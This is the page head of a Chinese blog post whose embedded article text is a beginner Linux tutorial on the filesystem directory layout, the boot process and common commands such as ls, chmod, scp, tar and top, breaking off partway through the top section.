<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>linux | Wjy&#39;s Blog</title>
<meta name="keywords" content="linux">
<meta name="description" content="文件目录解析

">
<meta name="author" content="">
<link rel="canonical" href="https://funny-toffee-4aa7c3.netlify.app/posts/%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80/linux/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.js" onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://funny-toffee-4aa7c3.netlify.app/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://funny-toffee-4aa7c3.netlify.app/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://funny-toffee-4aa7c3.netlify.app/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://funny-toffee-4aa7c3.netlify.app/apple-touch-icon.png">
<link rel="mask-icon" href="https://funny-toffee-4aa7c3.netlify.app/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="linux" />
<meta property="og:description" content="文件目录解析

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://funny-toffee-4aa7c3.netlify.app/posts/%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80/linux/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2017-03-05T10:49:36+00:00" />
<meta property="article:modified_time" content="2017-03-05T10:49:36+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="linux"/>
<meta name="twitter:description" content="文件目录解析

"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://funny-toffee-4aa7c3.netlify.app/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "linux",
      "item": "https://funny-toffee-4aa7c3.netlify.app/posts/%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80/linux/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "linux",
  "name": "linux",
  "description": "文件目录解析 ",
  "keywords": [
    "linux"
  ],
  "articleBody": "文件目录解析 /：根目录，linux文件系统入口，是最高级、最重要的目录，衍生出其他目录，还和系统开机、还原、修复有直接关系。 一般不要把应用程序直接放在根目录下，如果满了，可能导致无法开机。还需要注意某些程序的日志文件是否在根目录下。\n/bin：存放的是在单人维护模式下还能够被操作的指令，在/bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。\n/boot：存放内核和加载内核需要的文件，即启动系统需要的文件。\n/dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱 mount /dev/cdrom /mnt。\n/etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件。 重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d修改配置文件之前记得备份。\n/home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，~表示当前用户的家目录，~edu 表示用户 edu 的家目录。建议单独分区，并设置较大的磁盘空间，方便用户存放数据\n/lib： /usr/lib： /usr/local/lib：\" ：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助，比较重要的目录为 /lib/modules。\n/media：放置的就是可移除的装置。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。\n/mnt：临时文件系统的挂载点目录.以前和/media一样，但有专门/media后，专门做临时挂载\n/opt：第三方软件的存放目录\n/root：系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。\n/sbin：基本的系统维护命令,只能由超级用户使用.这些命令为开机、修复、还原系统过程所需要的。常见的命令有fdisk,fsck,ifconfig,init,mkfs\n/tmp：一般用户或正在执行的程序临时存放文件的目录,任何人都可以访问,重要数据不可放置在此目录下\n/srv：服务启动之后需要访问的数据目录，如www服务需要访问的网页数据存放在/srv/www内。\n/proc：是一个虚拟文件系统。放置内存中的数据，当有一个进程启动时，就有一个文件夹。 比较重要的/proc/meminfo,/proc/cpuinfo，可以通过这两文件查看内存和CPU情况，当然还有/proc/dma,/proc/interrupts,/proc/ioports,/proc/net/*等\n/sys：和/proc相似，也是虚拟文件系统，主要记录内核相关，比如内核模块，内核检测的硬件信息。\n/lost+found：这个目录是使用标准的ext2/ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录/disk/lost+found\n除了这些目录的内容之外，另外要注意的是，因为根目录与开机有关，开机过程中仅有根目录会被挂载， 其他分区则是在开机完成之后才会持续的进行挂载的行为。就是因为如此，因此根目录下与开机过程有关的目录， 就不能够与根目录放到不同的分区去。\n那哪些目录不可与根目录分开呢？有底下这些：\n/etc：配置文件 /bin：重要执行档 /dev：所需要的装置文件 /lib：执行档所需的函式库与核心所需的模块 /sbin：重要的系统执行文件\n这五个目录千万不可与根目录分开在不同的分区。请背下来啊。\n交换区：我们如果没有足够的内存，也许就不能运行某些大型的软件，解决的办法是在硬盘上划出一个区域来当作临时的内存，好像内存变大了。Windows 操作 系统把这个区域叫做虚拟内存，Linux把它叫做交换分区swap。\n/usr：依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的(shareable, static)。 /usr不是user的缩写，其实usr是Unix Software Resource的缩写， 也就是Unix操作系统软件资源所放置的目录，而不是用户的数据。 FHS建议所有软件开发者，应该将他们的数据合理的分别放置到这个目录下的次目录，而不要自行建立该软件自己独立的目录。 因为是所有系统默认的软件(distribution发布者提供的软件)都会放置到/usr底下，因此这个目录有点类似Windows系统的C：\\Windows\\ + C：\\Program files\\这两个目录的综合体，系统刚安装完毕时，这个目录会占用最多的硬盘容量。一般来说，/usr的次目录建议有底下这些：\n“/usr/X11R6/\"：为X Window System重要数据所放置的目录，之所以取名为X11R6是因为最后的X版本为第11版，且该版的第6次释出之意。\n/usr/bin/：绝大部分的用户可使用指令都放在这里。请注意到他与/bin的不同之处。(是否与开机过程有关)\n/usr/include/：c/c++等程序语言的档头(header)与包含档(include)放置处，当我们以tarball方式 (*.tar.gz 的方式安装软件)安装某些数据时，会使用到里头的许多包含档。\n/usr/lib/：包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。 某些软件会提供一些特殊的指令来进行服务器的设定，这些指令也不会经常被系统管理员操作， 那就会被摆放到这个目录下啦。要注意的是，如果你使用的是X86_64的Linux系统， 那可能会有/usr/lib64/目录产生\n/usr/local/：统管理员在本机自行安装自己下载的软件(非distribution默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于/usr/local/目录下，可与原先的旧版软件有分别啦。 你可以自行到/usr/local去看看，该目录下也是具有bin, etc, include, lib…的次目录\n/usr/sbin/：非系统正常运作所需要的系统指令。最常见的就是某些网络服务器软件的服务指令(daemon)\n/usr/share/：放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件嘛。在此目录下常见的还有这些次目录：/usr/share/man：联机帮助文件\n/usr/share/doc：软件杂项的文件说明\n/usr/share/zoneinfo：与时区有关的时区文件\n/usr/src/：一般原始码建议放置到这里，src有source的意思。至于核心原始码则建议放置到/usr/src/linux/目录下。\n/var：如果/usr是安装时会占用较大硬盘容量的目录，那么/var就是在系统运作后才会渐渐占用硬盘容量的目录。 因为/var目录主要针对常态性变动的文件，包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件， 包括程序文件(lock file, run file)，或者例如MySQL数据库的文件等等。常见的次目录有： /var/cache/：应用程序本身运作过程中会产生的一些暂存档\n/var/lib/：程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm去\n/var/lock/：某些装置或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该装置时， 就可能产生一些错误的状况，因此就得要将该装置上锁(lock)，以确保该装置只会给单一软件所使用。 举例来说，刻录机正在刻录一块光盘，你想一下，会不会有两个人同时在使用一个刻录机烧片？ 如果两个人同时刻录，那片子写入的是谁的数据？所以当第一个人在刻录时该刻录机就会被上锁， 第二个人就得要该装置被解除锁定(就是前一个人用完了)才能够继续使用\n/var/log/：非常重要。这是登录文件放置的目录。里面比较重要的文件如/var/log/messages, /var/log/wtmp(记录登入者的信息)等。\n/var/mail/：放置个人电子邮件信箱的目录，不过这个目录也被放置到/var/spool/mail/目录中，通常这两个目录是互为链接文件。\n/var/run/：某些程序或者是服务启动后，会将他们的PID放置在这个目录下\n/var/spool/：这个目录通常放置一些队列数据，所谓的“队列”就是排队等待其他程序使用的数据。 这些数据被使用后通常都会被删除。举例来说，系统收到新信会放置到/var/spool/mail/中， 但使用者收下该信件后该封信原则上就会被删除。信件如果暂时寄不出去会被放到/var/spool/mqueue/中， 等到被送出后就被删除。如果是工作排程数据(crontab)，就会被放置到/var/spool/cron/目录中。\n系统解析 引导过程 加载BIOS（通电自检），引导系统（BIOS设定）读取MBR，运行Grub，加载初始化配置文件，启动服务，运行rc.locak，生成终端或者X Window等待登录。 BIOS：每个主板都有一个自己的BIOS，启动硬件的第一步。 MBR：主引导记录，BIOS会默认从硬盘的第0柱面、第0磁道、第一个扇区中读取。一个扇区=512字节，446引导程序+64地盘分区表DPT+2MBR结束位，由fWindows的disk.ext或者Linux的fdisk程序产生，不依赖操作系统。 MBR记录可以修改因此可以实现多系统共存。 Grub：引导操作系统程序。地址记录于MBR中，其功能是根据配置文件加载kernel镜像，并运行/sbin/init，根据/etc/inittab进行初始化工作，根据runlevel确定系统运行级别和对应服务启动脚本。 引导级别 关机 单用户模式，用于系统维护，可以在忘记root密码时进入此模式修改密码。 无网络链接，多用户。 完全多用户模式，一般使用此级别。 保留未使用。 窗口模式，多用户网络链接。 重启。 命令管理 Linux中，一切配置皆文件。 man：查看命令的帮助，如：man ls。 种类：9 常见说明 可调用的系统 函数库 设备文件 文件格式 游戏说明 杂项 系统管理员可用的命令 与内核有关的说明 man 2 reboot：查看reboot在第2章里的说明。 命令格式 命令的一般格式：command [options] [arguments] 说明： command：命令名。 options：命令的选项，一般是一个单词或字母。有的命令有选项，有的命令没有选项。选项前面一般有“-”符号。选项是对命令参数的补充，当存在参数时才可能有选项。 arguments：命令的参数，有时候选项也带参数。有的命令有参数，有的命令没有参数。 []：方括号表示可有可无的意思。[options]表示有的命令有选项，有的命令 也可能没有选项。[arguments 表示有的命令有参数，有的命令可能没有参数。 举例： (1) 没有参数的命令像 ls，pwd 都没有选项和参数。直接输入命令，回车即可执行命令。 (2) 有参数没有选项的命令例如删除文件 myfile.txt 的命令，myfile.txt 就是参数：rm myfile.txt。 (3) 有参数也有选项的命令通过命令“rm myfile.txt”删除文件，系统会有确认提示，询问是否确定要删除。 可以通过一个选项，在执行命令时不再需要确认提示，命令格式如下： rm -f myfile.txt 此处的-f 就是选项，作用是进行强制删除，也就是没有确认提示。\n文件和目录操作 需掌握的常用命令：cd, ls, locate, less, grep, chmod, cp, mv, mkdir, rm。 Linux不像 Windows有C盘、D盘这么一说，它只有一个根目录“/”。\npwd pwd 命令代表\"print working directory”(打印工作目录)。当键入 pwd 时，系统 显示当前工作目录。 例如：[root@localhost]# pwd /root，表明当前的工作目录是：/root。\nls ls命令用户显示当前工作目录下的内容，包括子目录和文件。使用方法： [root@localhost]# ls\nll ll命令和ls命令功能一样，只是显示方式不一样，ll命令会列出当前目录下子目录和文件列表的详细信息。 使用方法如下：[root@localhost]# ll 显示的文件列表格式如下： drwxr-xr-x 3 user group 102 Mar11 22：56 Filename 文件列表显示了7个段，每一段分别的含义说明如下： (1) 第1段，drwxr-xr-x，表示文件属性，第1个字母d表示这个是个目录，如果是“-”表示文件。 d后面有9个字符，分成三组，每3个字符为一组。我们使用括号把他括起来：d(rwx)(r-x)(r-x)，对应含意：文件类型(所有者权限)(组权限)(其他人 权限)。这三组分别说明的是：文件的所有者权限，文件所属的组权限，和“其他人”的权限。每一组中每一位字符的含意如下： 第 1 位表示是否有读权限，有读权限，显示“r”，没有读权限，显示“-”。 第 2 位表示是否有写权限，有写权限，显示“w”，没有写权限，显示“-”。 第 3 位表示是否有执行权限，有执行权限，显示“x”，没有，显示“-”。 d(rwx)(r-x)(r-x)含意说明： 第 1 位 d：表示目录。 第 1 组(rwx)：表示文件所有者对这个文件的权限是，有读，写，执行权限。 第 2 组(r-x)：表示文件所属用 户组对这个文件的权限是：有读，没有写权限，有执行权限。 第 3 组(r-x)：表示 其他人对这个文件的权限是：有读，没有写权限，有执行权限。 (2) 第2段，目录下的文件和子目录个数：3表示目录下有3个文件或 目录 (注意：每个目录都有一个指向它本身的子目录\".\" 和指向它上级目录的子 目录\"..\") (3) 第 3 段，显示文件的所有者：user。 (4) 第 4 段，显示文件所属用户组：group。 (5) 第 5 段，文件大小：102 byte。 (6) 第 6 段，修改时间：Mar11 22：56。 (7) 第 7 段，文件名：Filename。\ncd cd 命令来改变工作目录。 例如把当前目录更改到/usr 目录下：[root@localhost]# cd /usr 例如把当前目录更改到整个系统的根目录下： [root@localhost]# cd / 几个常用 cd 用法： 命令 功能 cd tmp 进入当前目录下的tmp目录 cd ~ 回到当前用户的HOME目录下 cd / 回到整个系统的根目录 cd /etc 进入到/etc目录 cd .. 回到上一级目录\nlocate 使用 locate 命令来搜寻文件或目录。locate 命令直接在文件索引数据库里查找， 所以搜索文件的速度很快。如果需要更新文件索引数据库，则使用 updatedb 命 令。例如，如果想搜寻所有名称中带有 finger 这个词的文件或目录，命令如下： [root@localhost]# locate finger locate 有一个十分有用的选项 -r，它可以让你在搜索文件时使用正则表达式。 比如[root@localhost]# local --regex [0-9] locate是Linux系统中的一个查找文件命令，若在查找文件时提示： locate： can not open ‘/var/lib/mlocate/mlocate.db'： No such file or directory 原因是locate是通过生成一个文件和文件夹的索引数据库，当用户在执行loacte命令查找文件时，它会直接在索引数据库里查找，若该数据库太久没更新或不存在，则会提示以上错误。 解决方法是执行如下的命令，更新文件索引数据库。 [root@localhost]# updatedb\nfind 这是另一个 Linux 系统中重要的文件查找命令。其一般命令格式为：find 位置 -name 文件名称 例如，在\"/“这个根目录中查找\"linux.html\"文件，命令如下： [root@localhost]# find / -name linux.html 你除了可以按文件名称来使用find查找文件外，也可以根据文件大小(通过 -size n 选项指定)、时间(如 -atime n 表示查找 n 天前访问过的文件)来搜索文件。 此外，find 命令同样支持在搜索文件时使用正则表达式，你只需指定 -regex 选项即可。 find 和 locate 命令的区别：locate 是在建立好的索引的基础上进行查找， 查找要快很多。find 功能强大，但它是直接在硬盘上搜寻，查找速度比较慢。\nclear clear命令用于清除终端窗口，直接在终端输入clear，会清空当前屏幕。\ncat cat是concatenate(连锁)的简写，意思是合并文件。该命令可以显示文件的内容(经常和more搭配使用)，或者是将多个文件合并成一个文件。 cat主要有三大功能： (1) 一次显示整个文件。$ cat filename (2) 从键盘创建一个文件。$ cat \u003e filename \u003c\u003c 结束符 只能用于创建新文件，不能编辑已有文件。例如设置结束符为EOF cat \u003e 1.txt \u003c\u003c EOF 编辑文件完后，只需在最后一行键入“EOF”，然后回车即可。 (3) 将几个文件合并为一个文件： $cat file1 file2 \u003e file 参数： -n或–number：由1开始对所有输出的行数编号 -b或–number-nonblank：和-n相似，只不过对于空白行不编号 -s或–squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行 -v或–show-nonprinting：用‘^’输出控制字符除了LFD和TAB 例： 把1.txt和2.txt合并到3.txt cat 1.txt 2.txt \u003e 3.txt 把1.txt的内容加上行号后输入4.txt这个档案里 cat -n 1.txt \u003e 4.txt 把1.txt和2.txt的内容加上行号(空白行不加)之后将内容附加到3.txt里 cat -b 1.txt 2.txt \u003e\u003e 3.txt 和more一起使用，使用管道连起来。例如：cat /etc/passwd | more。 不过一般不这么用，使用麻烦。直接使用more命令即可，例如：more/etc/passwd\nmore 浏览超过一页的文件。在显示满一页时暂停，此时可按空格健继续显示下一个画面。 按Q键退出显示。Enter键滚动显示下一行。例如：[root@localhost]# more less less命令的用法与more命令类似，也可以用来浏览超过一页的文件。所不同的是less命令除了可以按空格键向下显示文件外，还可以利用上下键来卷动文件。当需要结束浏览时，只要在less命令的提示符“：”下按Q键即可。例如： [root@localhost]# less head 你可以使用head命令来查看文件的开头部分。此项命令是：head head是一个有用的命令，但是由于它只限于文件的最初几行，你看不到文件实际上有多长。按照默认设置，你只能阅读文件的前十行。你可以通过指定一个数字选项来改变显示的行数，如下面的命令所示：[root@localhost]# head -20 tail 与head命令恰恰相反的是tail命令。使用tail命令，你可以查看文件结尾的十行。这有助于查看日志文件的最后十行来阅读重要的系统消息。你还可以使用tail来观察日志文件被更新的过程。使用-f选项，tail会自动实时地把打开文件中的新消息显示到屏幕上。例如，要即时观察/var/log/messages的变化，以根用户身份在shell提示下键入以下命令： [root@localhost]# tail –f /var/log/messages。\ngrep grep命令用于在文件中查找指定的字串。例如，在temp.txt文件中查找每一个\"hello”，使用的命令如下：[root@localhost]# grep hello temp.txt 如果要显示行号，则使用如下命令： [root@localhost]# grep -n 要查找的内容 文件名\nchmod chmod命令用于改变文件或目录的访问权限。更改权限：给文件设置新的权限。例如，给test.sh文件设置权限[root@localhost]#chmod 644 test.sh 644 由3位数字组成： 第1位数字代表文件所有者对这个文件的权限 第2位数字代表文件所属用户组对这个文件的权限 第3位数字代表其他人对这个文件的权限。权限属性对应的数字如下： 例如： 仅有读权限，就是4。 仅有写权限就是2。 既有读，也有写权限，则把权限值加起来，4+2就是6。 644权限说明： 文件所有者对这个文件的权限是：读、写; 文件所属用户组对这个文件的权限：仅有读; 其他人对这个文件的权限：仅有读。 可通过ll命令查看权限更改后的情况。 加减权限： 在原有权限的基础之上，增加或减少权限，使用命令如下： chmod o+w test.sh o+w命令告诉系统给其他人对文件test.sh增加写权限。 chmod go -rw test.sh //但是会报错 组和其他人减去读取和写入权限。 下面是一个速记符号含义的列表：身份u：拥有文件的用户(User) 权限属性 对应数字 说明 r 4 文件可以被读取 w 2 文件可以被写入 x 1 文件可以被执行(如果它是程序的话) 0 相应的权限还没有被授予。 g：所有者所在的组群(Group) o：其他人(不是所有者或所属用户组的其他用户，Other) a：全部(All，包括 u、g、和 o)权限 r：读取权 w：写入权 x：执行权 +：添加权限 -：删除权限 =：使它成为唯一权限 常用的权限设置： 这里是一个某些常用设置、数值、以及它们的含义的列表： -rw——-(600)：只有所有者才有读取和写入的权限。 -rw-r-r– (644)：只有所有者才有读取和写入的权限，组群和其他人只有读取的权限。 -rwx—–(700)：只有所有者才有读取、写入和执行的权限。 -rwxr-xr-x(755)：所有者有读取、写入和执行的权限，组群和其他人只有读取和执行的权限。 -rwx–x–x(711)：所有者有读取、写入和执行权限，组群和其他人只有执行权限。 -rw-rw-rw-(666)：每个人都能够读取和写入文件。(请谨慎使用这些权限。) -rwxrwxrwx(777)：每个人都能够读取、写入和执行。(再重申一次，这种权限设置可能会很危险) 下面列举了一些对目录的常见设置： drwx—-(700)：只有所有者能在目录中读取、写入。 drwx-xr-x(755)：每个人都能够读取目录，但是其中的内容却只能被告所有者更改。\nchown chown用于改变文件的所有者。 命令格式： chown [-R] user[：group] file... user：新的档案拥有者的使用者ID group：新的档案拥有者的使用者群体(group) -R：对目前目录下的所有档案与子目录进行相同的拥有者变更(即以递归的方式逐个变更) 示例：chown root 4.txt\ncp cp(copy)命令可以将文件或目录复制到其他目录中。在使用cp命令时，只需要指定源文件名与目标文件名或目标目录即可。命令格式：cp \u003c源\u003e \u003c目标目录\u003e 例如，把当前目录下的test.txt文件拷贝到/tmp目录下：cp test.txt /tmp 拷贝目录(命令中需要使用-r选项)：cp -r \u003c源目录名\u003e \u003c目标目录\u003e 例如，把当前目录下的test目录拷贝到/tmp目录下：cp -r test /tmp\nscp scp是linux中功能最强大的文件传输命令，可以实现从本地到远程以及远程到本地的文件传输操作。 本地到远程的文件复制： 文件拷贝命令格式： scp local_file remote_username@remote_ip：remote_folder 或 scp local_file remote_username@remote_ip：remote_ local_file：本地文件名。 remote_username：远程计算机的用户名。 remote_ip：远程计算机的IP 地址。 remote_folder：远程计算机的目录。 示例：scp 1.mp3 root@192.168.1.2：/tmp/\n目录拷贝命令格式： scp -r local_folder remote_username@remote_ip：remote_folder 例如将本地/home/music/目录复制到远程/tmp/目录下： scp -r /home/music/ root@192.168.1.2：/tmp/ 复制后远程有/tmp/music/目录。\n从远程服务器复制文件到本地，只要将两个参数调换顺序即可： 拷贝文件： 例如把192.168.1.2上的/home/music/1.mp3拷贝到本地/tmp/目录下： scp root@192.168.1.2：/home/music/1.mp3 /tmp/ 拷贝目录： 例如把192.168.1.2上的/home/music/目录拷贝到本地/tmp/目录下： scp -r root@192.168.1.2：/home/music/ /tmp/\nmv mv命令用于移动文件和改名。mv的常见选项包括： -i：互动。如果你选择的文件会覆盖目标中的现存文件，它会提示你。这是一个实用的选项，因为它像cp中的-i选项一样，会给你一个确认替换已存文件的机会。 -f：强制。它会超越互动模式，不提示地移动文件。除非你知道自己在干什么，这个选项很危险。在你对系统信心十足之前，请谨慎使用这个选项。 -v：详细。显示文件的移动进度。 命令格式：mv \u003c源文件\u003e \u003c目标目录\u003e 如果你想把文件从你的主目录中移到另一个现存的目录中，使用以下命令： [root@localhost]# mv sneakers.txt /home/newuser/ 移动后同时给文件改名： [root@localhost]# mv sneakers.txt /home/newuser/new_sneakers.txt\n把当前文件夹的文件a改为b： mv a b\nmkdir mkdir(make directory)命令用来建立目录。例如在系统中当前目录下建立data子目录： [root@localhost]# mkdir data\nrm rm命令用于将文件或目录删除。如果是链接文件，只是删除了该链接，原有文件保持不变。删除文件和目录的选项包括： -i：互动。提示你确认删除，这个选项可以帮助你避免误删文件。 -f：Force，强制。代替互动模式，不提示地删除文件。除非你知道自己在干什么，使用这个选项通常不是明智之举。 -v：Verbose，显示操作过程的详细信息。显示文件的删除进度。 -r：Recursive，递归。将会删除某个目录及其中所有的文件和子目录。 例如要使用rm命令来删除文件tmp.txt，命令如下：rm tmp.txt 如果要删除目录，命令如下：rm -r 目录名 强制删除目录及以下文件：rm -rf 目录名\n文件归档和压缩 需掌握的常用命令：tar，zip，unzip，gzip，gunzip。\nzip和unzip zip命令用于打包和压缩文件。 压缩示例：zip -r data.zip data 将当前目录下的data文件夹和内部文件全部压缩成data.zip文件，-r表示递归压缩子目录下所有文件。 zip -r data.zip * 将当前目录下所有文件夹和文件全部压缩成data.zip文件。 zip -r data.zip /home/data 将/home/data这个目录下的所有文件夹和文件压缩为当前目录下的data.zip\n如果现在在/home 这个目录下： zip -r data.zip data\nunzip命令用于解压扩展名为.zip的文件。 解压到当前目录： unzip data.zip\n解压到指定目录： unzip data.zip -d /home/wjy/Desktop/\ncentos需要安装zip和unzip指令： yum install -y unzip zip\ngzip/gunzip gzip命令用于压缩\".gz\"文件，gunzip用于解开被gzip压缩过的文件，这些压缩文件预设最后的扩展名为\".gz\"。 压缩：gzip usr.tar 解压：gunzip usr.tar.gz\ntar tar命令用于文件打包，不是压缩。 打包例子：tar -cvf myfile.tar 目录解包例子：tar -xvf myfile.tar 如果一个压缩包是.tar.gz格式，则可以先通过gunzip解压，然后再通过tar解包。也可以通过tar命令直接解压解包，只需在解包加个参数z： tar -xzvf myfile.tar.gz tar命令常用选项： -c：建立新的归档文件 -x：从归档文件中解出文件 -v：处理过程中输出相关信息 -f：指定的文件名 -z：与-x 联用时调用gzip完成对gz文件的解压\n系统管理 需掌握的常用命令：free, top, shutdown。\nfree free命令用于查看当前系统内存的使用情况，它可以显示系统中剩余和已用的物理内存、交换内存和内核缓冲区。 例如：[root@localhost]# free\nshutdown 该命令用于关机。语法规则如下：shutdown [-cfFhknr(参数名称)] [-t 秒数] 时间 [警告信息] 具体各参数功能： -c：取消前一个shutdown命令。值得注意的是，当执行一个如\"shutdown -h 11：10\"的命令时，只要按“Ctrl+C”键就可以中断关机的命令。若是执行如\"shutdown -h 11：10 \u0026 “的命令将shutdown转到后台时，则需要使用shutdown -c将前一个shutdown命令取消。 -f：重新启动时不执行fsck(注：fsck是Linux下的一个检查和修复文件系统的程序)。 -F：重新启动时执行fsck。 -h：将系统关机，在某种程度上功能与halt命令相当。 -k：只是送出信息给所有用户，但并不会真正关机。 -n：不调用init程序关机，而是由shutdown自己进行(一般关机程序是由shutdown调用init来实现关机动作)，使用此参数将加快关机速度，但是不建议用户使用此种关机方式。 -r：shutdown之后重新启动系统。\n-t \u003c秒数\u003e：送出警告信息和关机信号之间要延迟多少秒。警告信息将提醒用户保存当前进行的工作。 [时间]：设置多久时间后执行shutdown命令。时间参数有hh：mm或+m两种模式。hh：mm格式表示在几点几分执行shutdown命令。 例如shutdown 10：45表示将在10：45执行shutdown。+m表示m分钟后执行shutdown。 比较特别的用法是以now表示立即执行shutdown。注意这部分参数不能省略。 [警告信息]：要传送给所有登入用户的信息。 应用举例： 立即关机： shutdown -h now 定时关机(11点10分关机，如果要取消按 Ctrl+C 键)： shutdown -h 11：10或 shutdown 11：10 指定5分钟后关机，同时送出警告信息给登入用户： shutdown +5 \"System will shutdown after 5 minutes\" 重启计算机： shutdown -r now\nreboot 重启计算机。用法： reboot\ndate 该命令可以显示当前系统的日期和时间，也可以设置日期和时间。clock命令也可以用于显示系统的日期与时间(默认情况下，普通用户无法执行clock命令，必须用root账号登录执行)。 例如，显示日期和时间： date 设置日期和时间： date -s \"2017-04-11 11：28：30\"\ncal 该命令可显示计算机中的日历。 显示当前月日历：# cal 显示指定年份的日历命令： cal 2016 显示指定月份的日历命令： cal 9 2016\ntop top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。例如：[root@localhost]# top 统计信息区前五行是系统整体的统计信息： 第一行是任务队列信息，同uptime命令的执行结果，其内容如下： 01：06：48：当前时间 up 1：22：系统运行时间，格式为时：分 1 user：当前登录用户数 load average： 0.06, 0.60, 0.48：系统负载，即任务队列的平均长度。三个数值分别为1分钟、5分钟、15分钟前到现在的平均值. 第二行为进程信息，内容如下： Tasks：29 total：进程总数 1 running：正在运行的进程数 28 sleeping：睡眠的进程数 0 stopped：停止的进程数 0 zombie：僵尸进程数 第三行为CPU的信息，当有多个CPU时，这些内容可能会超过两行： Cpu(s)： 0.3% us：用户空间占用CPU百分比 1.0% sy：内核空间占用CPU百分比 0.0% ni：用户进程空间内改变过优先级的进程占用CPU百分比 98.7% id：空闲CPU百分比 0.0% wa：等待输入输出的CPU时间百分比 0.0% hi： CPU服务于硬中断所耗费的时间总额 0.0% si、0.0%st：CPU服务于软中断所耗费的时间总额、Steal Time 最后两行为内存信息，内容如下： Mem： 191272k total：物理内存总量 173656k used：使用的物理内存总量 17616k free：空闲内存总量 22052k buffers：用作内核缓存的内存量 Swap： 192772k total：交换区总量 0k used：使用的交换区总量(0kb) 192772k free：空闲交换区总量 123988k cached：缓冲的交换区总量，内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小，相应的内存再次被换出时可不必再对交换区写入。 进程信息区统计信息区域的下方显示了各个进程的详细信息： 首先来认识一下各列的含义： 列名-含义 PID：进程id PPID：父进程id RUSER：Real user name UID：进程所有者的用户id USER：进程所有者的用户名 GROUP：进程所有者的组名 TTY：启动进程的终端名，不是从终端启动的进程则显示为 ? PR：优先级 NI：nice值，负值表示高优先级，正值表示低优先级 P：最后使用的CPU，仅在多CPU环境下有意义 %CPU：上次更新到现在的CPU时间占用百分比 TIME：进程使用的CPU时间总计，单位秒 TIME+：进程使用的CPU时间总计，单位1/100秒 %MEM：进程使用的物理内存百分比 VIRT：进程使用的虚拟内存总量，单位kb，VIRT = SWAP + RES SWAP：进程使用的虚拟内存中，被换出的大小，单位kb RES：进程使用的、未被换出的物理内存大小,单位kb，RES = CODE + DATA CODE：可执行代码占用的物理内存大小，单位kb DATA：可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb SHR：共享内存大小，单位kb nFLT：页面错误次数 nDRT：最后一次写入到现在，被修改过的页面数\n1 2 3 4 5 6 S：进程状态 D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程 COMMAND：命令名/命令行 WCHAN：若该进程在睡眠,则显示睡眠中的系统函数名 Flags：任务标志,参考 